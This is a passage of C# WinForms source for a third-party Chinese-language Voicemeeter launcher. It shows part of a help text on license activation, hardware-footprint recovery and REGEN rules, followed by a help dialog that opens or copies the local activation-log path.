· 2022 年 —— 更新显卡驱动后挑战码变更，因硬件层面确实发生了相关变动，
  足迹无法恢复生效，最终需重新购买授权。

· 2023 年 —— 未更换硬件但激活失效，
  官方优先建议恢复足迹备份，找回原挑战码以复用原有授权。

可提炼的三条经验
1. 硬件没变：先恢复足迹，不花 REGEN 次数。
2. 硬件已换（CPU / 主板）：足迹无效，只能用 REGEN 或重新购买。
3. 驱动 / 系统更新后失效：先怀疑挑战码已变，别急着重买授权。

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

免责声明
以上内容由「杨爽工作室」整理自 VB-Audio 官方公开说明与实际沟通记录，仅供查阅参考；
授权规则、价格、次数以 VB-Audio 官方页面为准。
本启动器为第三方汉化工具，与 VB-Audio 无隶属关系。";

        static readonly Color LBg = Color.FromArgb(13, 19, 28);
        static readonly Color LPanel = Color.FromArgb(19, 27, 38);
        static readonly Color LEdit = Color.FromArgb(24, 33, 45);
        static readonly Color LFg = Color.FromArgb(226, 234, 243);
        static readonly Color LFgDim = Color.FromArgb(148, 170, 192);
        static readonly Color LAccent = Color.FromArgb(47, 129, 247);

        RichTextBox rtb;
        Button[] nav;

        static readonly string[] NavTitles = {
            "① 授权机制",
            "② 挑战码变更原因",
            "③ 变更后怎么办",
            "④ REGEN 权益",
            "⑤ 异常排查与支持",
            "⑥ 历史结论与免责"
        };

        static readonly string[] Bodies = { T1, T2, T3, T4, T5, T6 };

        public static void ShowLicense()
        {
            try
            {
                using (LicenseForm f = new LicenseForm()) f.ShowDialog();
            }
            catch { }
        }

        static Font LF(float sz, FontStyle st)
        {
            try { return new Font("Microsoft YaHei UI", sz, st); }
            catch { return new Font(FontFamily.GenericSansSerif, sz, st); }
        }

        public LicenseForm()
        {
            Text = "Voicemeeter 授权与激活帮助";
            ClientSize = new Size(820, 660);
            MinimumSize = new Size(760, 560);
            StartPosition = FormStartPosition.CenterScreen;
            BackColor = LBg;
            ForeColor = LFg;
            Font = LF(10f, FontStyle.Regular);
            MaximizeBox = false;
            AutoScaleMode = AutoScaleMode.None;
            KeyPreview = true;
            KeyDown += delegate(object s, KeyEventArgs ke) { if (ke.KeyCode == Keys.Escape) Close(); };

            Panel body = new Panel();
            body.Dock = DockStyle.Fill;
            body.BackColor = LBg;
            body.Padding = new Padding(14, 12, 14, 10);
            Controls.Add(body);

            Panel head = new Panel();
            head.Dock = DockStyle.Top;
            head.Height = 74;
            head.BackColor = LPanel;
            Controls.Add(head);

            Label t = new Label();
            t.Text = "Voicemeeter 授权与激活帮助";
            t.Font = LF(15f, FontStyle.Bold);
            t.ForeColor = LFg;
            t.AutoSize = true;
            t.Left = 20;
            t.Top = 12;
            head.Controls.Add(t);

            Label st = new Label();
            st.Text = "挑战码 / 响应码  ·  硬件足迹备份与恢复  ·  REGEN 规则  ·  官方支持渠道";
            st.Font = LF(9f, FontStyle.Regular);
            st.ForeColor = LFgDim;
            st.AutoSize = true;
            st.Left = 22;
            st.Top = 44;
            head.Controls.Add(st);

            Panel navp = new Panel();
            navp.Dock = DockStyle.Left;
            navp.Width = 196;
            navp.BackColor = LPanel;
            Controls.Add(navp);

            nav = new Button[NavTitles.Length];
            for (int i = 0; i < NavTitles.Length; i++)
            {
                Button b = new Button();
                b.Text = NavTitles[i];
                b.TextAlign = ContentAlignment.MiddleLeft;
                b.Padding = new Padding(14, 0, 0, 0);
                b.FlatStyle = FlatStyle.Flat;
                b.FlatAppearance.BorderSize = 0;
                b.SetBounds(10, 12 + i * 46, 176, 38);
                b.BackColor = LPanel;
                b.ForeColor = LFgDim;
                b.Font = LF(9.5f, FontStyle.Regular);
                b.Cursor = Cursors.Hand;
                int idx = i;
                b.Click += delegate { Select(idx); };
                navp.Controls.Add(b);
                nav[i] = b;
            }

            Panel foot = new Panel();
            foot.Dock = DockStyle.Bottom;
            foot.Height = 58;
            foot.BackColor = LPanel;
            Controls.Add(foot);

            rtb = new RichTextBox();
            rtb.Dock = DockStyle.Fill;
            rtb.BackColor = LEdit;
            rtb.ForeColor = LFg;
            rtb.BorderStyle = BorderStyle.None;
            rtb.ReadOnly = true;
            rtb.Font = LF(10.5f, FontStyle.Regular);
            rtb.ScrollBars = RichTextBoxScrollBars.Vertical;
            rtb.DetectUrls = false;
            rtb.WordWrap = true;
            body.Controls.Add(rtb);

            Button bSet = MkBtn("设置", 20, 12, 74);
            bSet.Click += delegate { SettingsForm.ShowSettings(); };
            foot.Controls.Add(bSet);

            Button bOpen = MkBtn("打开激活日志目录", 102, 12, 148);
            bOpen.Click += OpenLogDir;
            foot.Controls.Add(bOpen);

            Button bCopy = MkBtn("复制日志路径", 258, 12, 112);
            bCopy.Click += CopyLogPath;
            foot.Controls.Add(bCopy);

            Button bCfg = MkBtn("打开配置目录", 378, 12, 124);
            bCfg.Click += delegate { ConfigInfo.OpenConfigDir(); };
            foot.Controls.Add(bCfg);

            Button bClose = MkBtn("关闭", 510, 12, 80);
            bClose.Click += delegate { Close(); };
            foot.Controls.Add(bClose);

            Label tip = new Label();
            tip.Text = "第三方汉化工具，非 VB-Audio 官方产品";
            tip.AutoSize = true;
            tip.ForeColor = LFgDim;
            tip.Font = LF(8.5f, FontStyle.Regular);
            tip.Top = 22;
            foot.Controls.Add(tip);
            foot.Resize += delegate { tip.Left = foot.Width - tip.Width - 18; };

            Select(0);
        }

        Button MkBtn(string text, int x, int y, int w)
        {
            Button b = new Button();
            b.Text = text;
            b.FlatStyle = FlatStyle.Flat;
            b.FlatAppearance.BorderSize = 1;
            b.FlatAppearance.BorderColor = Color.FromArgb(58, 86, 116);
            b.BackColor = LEdit;
            b.ForeColor = LFg;
            b.Font = LF(9f, FontStyle.Regular);
            b.Cursor = Cursors.Hand;
            b.SetBounds(x, y, w, 32);
            return b;
        }

        void Select(int i)
        {
            for (int k = 0; k < nav.Length; k++)
            {
                bool on = (k == i);
                nav[k].BackColor = on ? Color.FromArgb(34, LAccent) : LPanel;
                nav[k].ForeColor = on ? Color.White : LFgDim;
                nav[k].Font = LF(9.5f, on ? FontStyle.Bold : FontStyle.Regular);
            }
            rtb.Text = Bodies[i];
            rtb.SelectionStart = 0;
            rtb.SelectionLength = 0;
            rtb.ScrollToCaret();
        }

        static string LogDir()
        {
            return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "Voicemeeter");
        }

        static string LogFile()
        {
            return Path.Combine(LogDir(), "Voicemeeter_ActivationLog.dat");
        }

        void OpenLogDir(object sender, EventArgs e)
        {
            try
            {
                string dir = LogDir();
                if (!Directory.Exists(dir))
                {
                    MessageBox.Show("未找到目录：\n" + dir +
                        "\n\n说明尚未产生激活日志，或本机未安装 / 未激活过 Voicemeeter。",
                        "Voicemeeter 授权与激活帮助", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return;
                }
                if (File.Exists(LogFile()))
                    Process.Start("explorer.exe", "/select,\"" + LogFile() + "\"");
                else
                    Process.Start("explorer.exe", "\"" + dir + "\"");
            }
            catch (Exception ex)
            {
                MessageBox.Show("打开目录失败：" + ex.Message,
                    "Voicemeeter 授权与激活帮助", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }

        void CopyLogPath(object sender, EventArgs e)
        {
            try
            {
                Clipboard.SetText(LogFile());
                MessageBox.Show("已复制到剪贴板：\n" + LogFile(),
                    "Voicemeeter 授权与激活帮助", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show("复制失败：" + ex.Message,
                    "Voicemeeter 授权与激活帮助", MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }
    }

}
